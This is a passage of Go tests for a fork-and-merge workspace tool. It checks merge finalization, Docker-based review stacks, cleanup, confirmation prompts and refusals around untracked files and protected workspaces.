	if err := gitFetchInto(repo, ws, identity.Name); err != nil {
		t.Fatal(err)
	}
	if err := forkspace.GitRun(repo, "merge", "--ff-only", "review/"+identity.Name); err != nil {
		t.Fatal(err)
	}
	if forkspace.GitOut(repo, "rev-list", "--count", "HEAD..review/"+identity.Name) != "0" {
		t.Fatal("fixture is not zero commits ahead after the external fast-forward")
	}
	if _, pending, err := readLandIntent(repo, identity); err != nil || pending {
		t.Fatalf("candidate-only fixture has land journal = %v, %v", pending, err)
	}
	code, err := c.forkMergeAll(repo, []string{identity.Name}, "", false, true)
	if err != nil || code != 0 {
		t.Fatalf("merge-all candidate finalization = %d, %v", code, err)
	}
	if item, ok := mustCurrentTask(t, root, "canonical-task"); !ok || item.State != tasks.StateDone {
		t.Fatalf("canonical task after candidate finalization = %+v, %v", item, ok)
	}
	if pathExists(ws) {
		t.Fatal("clean zero-ahead candidate fork was not removed")
	}
	if _, pending, err := readLandIntent(repo, identity); err != nil || pending {
		t.Fatalf("candidate finalization land journal = %v, %v", pending, err)
	}
}

func TestForkMergeAllSkipsOnlyGenuinelyEmptyFork(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "empty")
	if err != nil {
		t.Fatal(err)
	}
	c := &Control{cfg: &config.Config{}}
	var lines []string
	ui.SetLiveSink(func(line string) { lines = append(lines, line) })
	t.Cleanup(func() { ui.SetLiveSink(nil) })
	code, err := c.forkMergeAll(repo, []string{"empty"}, "", false, true)
	if err != nil || code != 0 {
		t.Fatalf("empty merge-all = %d, %v", code, err)
	}
	if !pathExists(ws) {
		t.Fatal("genuinely empty fork was deleted")
	}
	if got := strings.Join(lines, "\n"); !strings.Contains(got, "Skipped empty — no new commits or pending landing.") ||
		strings.Contains(got, "Merged 0 forks") || strings.Contains(got, "empty fork will be deleted") {
		t.Fatalf("empty skip output:\n%s", got)
	}
}

// emisar's draft-PR reviews failed three times on 2026-10-01: its gate's database tests found no
// PostgreSQL, though its project file declares a review stack for exactly that. A controller review
// read nothing from the candidate's project file. It now starts the candidate's review stack, joins
// its network, gives the gate the stack's environment under the job's own, and removes the stack
// after; the controller's own environment still comes last, and nothing else from the project
// file applies.
func TestControllerJobReviewStartsTheCandidatesReviewStack(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("COOP_GATE", "true")
	t.Setenv("COOP_EGRESS", "open")
	repo := initRepo(t)
	for path, body := range map[string]string{
		project.File: "box:\n  env:\n    BOX_ONLY: \"1\"\nreview:\n  compose: dev/review-compose.yml\n  env:\n" +
			"    CI: \"1\"\n    DATABASE_URL: postgres://postgres:postgres@db/emisar_test\n",
		"dev/review-compose.yml": "services:\n  db:\n    image: postgres:18\n",
	} {
		if err := os.MkdirAll(filepath.Dir(filepath.Join(repo, path)), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, path), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	git(t, repo, "add", ".")
	git(t, repo, "commit", "-qm", "a review stack")
	state := filepath.Join(t.TempDir(), "sessions")
	staging := filepath.Join(state, "review-candidates", ".staging")
	if err := os.MkdirAll(staging, 0o700); err != nil {
		t.Fatal(err)
	}
	candidate := filepath.Join(staging, "review-stack-123456")
	git(t, repo, "clone", "-q", "--", repo, candidate)
	git(t, candidate, "update-ref", "refs/coop/session-parent", "HEAD")
	// Named docker, since only Docker can enforce a job's resource limits; the fixture endpoint
	// keeps a real Docker daemon from being asked for its identity.
	t.Setenv("DOCKER_CONTEXT", "")
	t.Setenv("DOCKER_HOST", dockersock.Serve(t, func() (dockersock.Info, error) {
		return dockersock.Info{ID: "daemon-one", OSType: "linux", Architecture: "amd64", ServerVersion: "29", KernelVersion: "fixture", SecurityOptions: []string{}}, nil
	}))
	runtimePath := filepath.Join(t.TempDir(), "docker")
	callsPath := filepath.Join(t.TempDir(), "calls")
	argsPath := filepath.Join(t.TempDir(), "args")
	script := "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"$COOP_TEST_CALLS\"\n" +
		"case \"$*\" in\n  *\"config --services\"*) printf 'db\\n' ;;\nesac\n" +
		"case \"$1\" in\nrun) printf '%s\\n' \"$@\" > \"$COOP_TEST_ARGS\" ;;\nesac\nexit 0\n"
	if err := os.WriteFile(runtimePath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("COOP_TEST_CALLS", callsPath)
	t.Setenv("COOP_TEST_ARGS", argsPath)
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg.BaseImage = "worker-box"
	fc := New(cfg, runtime.Runtime{Name: runtimePath}, Host{})
	run, err := fc.ReviewControllerJob(context.Background(), sessionsvc.ReviewGateRequest{
		Repository: repo, Candidate: candidate, StateRoot: state, OperationID: "review-stack", NetworkMode: "open",
		Command: []string{"./run", "gate"}, Environment: map[string]string{"CI": "job"},
		Resources: workerproto.JobResources{CPUMillis: 1000, MemoryBytes: 1 << 30, PIDs: 256},
	})
	if err != nil || !run.Passed() {
		t.Fatalf("controller job review = %+v error %v", run, err)
	}
	calls := readLines(t, callsPath)
	up := slices.IndexFunc(calls, func(call string) bool { return strings.Contains(call, "up -d --wait --remove-orphans") })
	boxRun := slices.IndexFunc(calls, func(call string) bool { return strings.HasPrefix(call, "run ") })
	// The stack goes by its project label, not by re-reading the candidate's compose file, which
	// the gate may have deleted.
	down := slices.IndexFunc(calls, func(call string) bool {
		return strings.HasPrefix(call, "ps -q -a --filter label=com.docker.compose.project=")
	})
	if up < 0 || boxRun < 0 || down < 0 || !(up < boxRun && boxRun < down) {
		t.Fatalf("the review stack must start before the gate and go after it:\n%s", strings.Join(calls, "\n"))
	}
	args := strings.Join(readLines(t, argsPath), "\n") + "\n"
	network := regexp.MustCompile(`--network\n([^\n]+_default)\n`).FindStringSubmatch(args)
	if network == nil || !strings.Contains(calls[up], "-p "+strings.TrimSuffix(network[1], "_default")) {
		t.Fatalf("the gate must join the review stack's network:\n%s\n%s", args, calls[up])
	}
	if !strings.Contains(args, "-e\nDATABASE_URL=postgres://postgres:postgres@db/emisar_test\n") {
		t.Fatalf("the gate must get the review stack's environment:\n%s", args)
	}
	candidateCI, jobCI := strings.Index(args, "CI=1\n"), strings.Index(args, "CI=job\n")
	if candidateCI < 0 || jobCI < 0 || candidateCI > strings.Index(args, "COOP_REVIEW_BASE=") || candidateCI > jobCI {
		t.Fatalf("the job's own environment must come after the candidate's, so it wins:\n%s", args)
	}
	if strings.Contains(args, "BOX_ONLY") {
		t.Fatalf("a controller review must not take the candidate's box settings:\n%s", args)
	}
}

func readLines(t *testing.T, path string) []string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return strings.Split(strings.TrimSpace(string(data)), "\n")
}

func TestForkMergeQueueReportsCleanupFailureAndContinues(t *testing.T) {
	repo := initRepo(t)
	var first string
	for _, name := range []string{"a", "b"} {
		ws, err := forkspace.Setup(repo, name)
		if err != nil {
			t.Fatal(err)
		}
		writeTaskFile(t, filepath.Join(ws, name+".txt"), name+"\n")
		if name == "a" {
			first = ws
			writeTaskFile(t, filepath.Join(ws, filepath.FromSlash(project.DefaultCompose)), "services:\n  db:\n    image: postgres:18.4-alpine\n")
		}
		git(t, ws, "add", "-A")
		git(t, ws, "commit", "-qm", name)
	}
	late := filepath.Join(first, "shutdown.txt")
	t.Setenv("COOP_TEST_LATE_FILE", late)
	shim := filepath.Join(t.TempDir(), "runtime")
	if err := os.WriteFile(shim, []byte("#!/bin/sh\nfor arg in \"$@\"; do\n if [ \"$arg\" = down ]; then printf 'late work\\n' > \"$COOP_TEST_LATE_FILE\"; fi\ndone\n"), 0700); err != nil {
		t.Fatal(err)
	}
	c := &Control{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}, rt: runtime.Runtime{Name: shim}}
	code, err := c.ForkMerge([]string{"--all", "--force", "--yes"})
	if code == 0 || err == nil || !strings.Contains(err.Error(), "cleanup fork a") {
		t.Errorf("cleanup result: %d %v", code, err)
	}
	for _, name := range []string{"a", "b"} {
		if raw, err := os.ReadFile(filepath.Join(repo, name+".txt")); err != nil || string(raw) != name+"\n" {
			t.Errorf("landing %s: %q %v", name, raw, err)
		}
	}
	if raw, err := os.ReadFile(late); err != nil || string(raw) != "late work\n" {
		t.Errorf("late work lost: %q %v", raw, err)
	}
	if pathExists(forkspace.Workspace(repo, "b")) {
		t.Error("second fork not cleaned up")
	}
}

func TestNativeRemovalRefusesUnreservedPrimaryBeforeConfirmation(t *testing.T) {
	repo := initRepo(t)
	workspace, err := forkspace.Setup(repo, "unreserved-primary")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(workspace, ".git", forkspace.ImmutablePrimaryMarker), []byte(`{"version":99}`), 0600); err != nil {
		t.Fatal(err)
	}
	control := &Control{cfg: &config.Config{RepoOverride: repo}, askDelete: func(string) bool { t.Error("unknown primary reached destructive confirmation"); return false }}
	for _, args := range [][]string{{"unreserved-primary", "--force"}, {"unreserved-primary", "--force", "--yes"}} {
		code, err := control.ForkRm(args)
		if code != 1 || err == nil || !strings.Contains(err.Error(), "immutable read-only primary") {
			t.Fatalf("native removal = %d %v", code, err)
		}
	}
	if !pathExists(workspace) {
		t.Fatal("unknown primary disappeared")
	}
}

// A fork that does not exist is named as that, before a dirty tree or a confirmation asks about it.
func TestForkMergeNamesAMissingForkFirst(t *testing.T) {
	repo := initRepo(t)
	writeTaskFile(t, filepath.Join(repo, "dirty.txt"), "x\n")
	c := &Control{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
	if code, err := c.ForkMerge([]string{"nosuch"}); code != 2 || err == nil || !strings.Contains(err.Error(), `No fork named "nosuch"`) {
		t.Errorf("ForkMerge(nosuch) = (%d, %v), want no such fork", code, err)
	}
}

// A file in Coop's private fork folder reached the commit only through a forced add: merging it would
// put Coop's state in the project, so it waits for a person.
func TestPolicyScanFlagsCoopsPrivateForkFolder(t *testing.T) {
	repo := initRepo(t)
	git(t, repo, "checkout", "-q", "-b", "stray")
	writeTaskFile(t, filepath.Join(repo, ".coop", "task-executions", "generation", "bye.txt"), "bye\n")
	writeTaskFile(t, filepath.Join(repo, ".COOP", "other.txt"), "other\n") // a Mac checks this out as .coop
	writeTaskFile(t, filepath.Join(repo, "docs", ".coop-notes.txt"), "fine\n")
	git(t, repo, "add", "-f", "-A")
	git(t, repo, "commit", "-qm", "stray")
	git(t, repo, "checkout", "-q", "-")
	warns, err := PolicyScan(repo, "stray")
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(warns, "\n")
	if strings.Count(joined, "private fork folder") != 2 || strings.Contains(joined, ".coop-notes") {
		t.Errorf("warnings = %q", joined)
	}
}

// An untracked file in the project does not stop an ordinary merge, as it does not stop an isolated
// one; it stays as it was. An untracked file the fork would land on still stops it, by name, and
// nothing lands. A change to a tracked file still stops it before anything runs.
func TestOrdinaryForkMergeIgnoresUntrackedFilesItDoesNotLandOn(t *testing.T) {
	t.Run("unrelated", func(t *testing.T) {
		repo := initRepo(t)
		setupMergeFork(t, repo, "perf")
		writeTaskFile(t, filepath.Join(repo, "scratch.txt"), "a note\n")
		c := &Control{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
		var code int
		var err error
		stderr := captureStderr(t, func() { code, err = c.ForkMerge([]string{"perf", "--yes"}) })
		if code != 0 || err != nil {
			t.Fatalf("merge with an untracked file in the project = (%d, %v)\n%s", code, err, stderr)
		}
		if !pathExists(filepath.Join(repo, "perf.txt")) {
			t.Error("the fork's commit did not land")
		}
		if got, err := os.ReadFile(filepath.Join(repo, "scratch.txt")); err != nil || string(got) != "a note\n" {
			t.Errorf("the untracked file = %q, %v; want it kept as it was", got, err)
		}
	})
	t.Run("landed on", func(t *testing.T) {
		repo := initRepo(t)
		ws := setupMergeFork(t, repo, "perf")
		writeTaskFile(t, filepath.Join(repo, "perf.txt"), "my own perf.txt\n")
		parentBefore := checkoutState(repo)
		c := &Control{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
		var code int
		var err error
		stderr := captureStderr(t, func() { code, err = c.ForkMerge([]string{"perf", "--yes"}) })
		if code != 1 || !strings.Contains(stderr, `the fork adds "perf.txt"`) ||
			!strings.Contains(stderr, "move or delete them, then merge again") {
			t.Fatalf("merge onto an untracked file = (%d, %v), want a refusal naming perf.txt\n%s", code, err, stderr)
		}
		if checkoutState(repo) != parentBefore || !pathExists(ws) {
			t.Error("a refused merge changed the parent or removed the fork")
		}
		if got, _ := os.ReadFile(filepath.Join(repo, "perf.txt")); string(got) != "my own perf.txt\n" {
			t.Errorf("the untracked file the fork would land on = %q, want it kept", got)
		}
	})
	t.Run("tracked change", func(t *testing.T) {
		repo := initRepo(t)
		setupMergeFork(t, repo, "perf")
		writeTaskFile(t, filepath.Join(repo, "README.md"), "edited\n")
		c := &Control{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
		code, err := c.ForkMerge([]string{"perf", "--yes"})
		if block := requireBlock(t, code, err, 1); block.Headline != "Your working tree has uncommitted changes" {
			t.Errorf("refusal = %#v", block)
		}
		if pathExists(filepath.Join(repo, "perf.txt")) {
			t.Error("a merge over a tracked change landed")
		}
	})
}

// Answering no at the merge prompt changes nothing and exits 1, as every declined confirmation does;
// yes still merges and exits 0.
func TestForkMergeDeclinedExitsOne(t *testing.T) {
	for _, tc := range []struct {
		name     string
		isolated bool
		answers  string
		wantCode int
		merged   bool
	}{
		{name: "declined", answers: "n\n", wantCode: 1},
		{name: "accepted", answers: "y\nn\n", merged: true},
		{name: "isolated declined", isolated: true, answers: "n\n", wantCode: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var repo, ws, name string
			if tc.isolated {
				var identity forkspace.Identity
				repo, ws, _, identity, _ = prepareForkTaskCandidateMode(t, "iso", true, true, nil)
				name = identity.Name
			} else {
				repo, name = initRepo(t), "a"
				var err error
				if ws, err = forkspace.Setup(repo, name); err != nil {
					t.Fatal(err)
				}
				writeTaskFile(t, filepath.Join(ws, "feature.txt"), "fork\n")
				git(t, ws, "add", "-A")
				git(t, ws, "commit", "-qm", "fork work")
			}
			before := forkspace.GitOut(repo, "rev-parse", "HEAD")
			c := &Control{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
			defer ui.AnswerConfirmationsFrom(strings.NewReader(tc.answers))()
			var code int
			var err error
			stderr := captureStderr(t, func() { code, err = c.ForkMerge([]string{name}) })
			if code != tc.wantCode || err != nil {
				t.Fatalf("ForkMerge after %q = (%d, %v), want (%d, nil)\n%s", tc.answers, code, err, tc.wantCode, stderr)
			}
			if merged := forkspace.GitOut(repo, "rev-parse", "HEAD") != before; merged != tc.merged {
				t.Errorf("merged = %v, want %v\n%s", merged, tc.merged, stderr)
			}
			if !pathExists(ws) {
				t.Errorf("the fork is gone\n%s", stderr)
			}
		})
	}
}
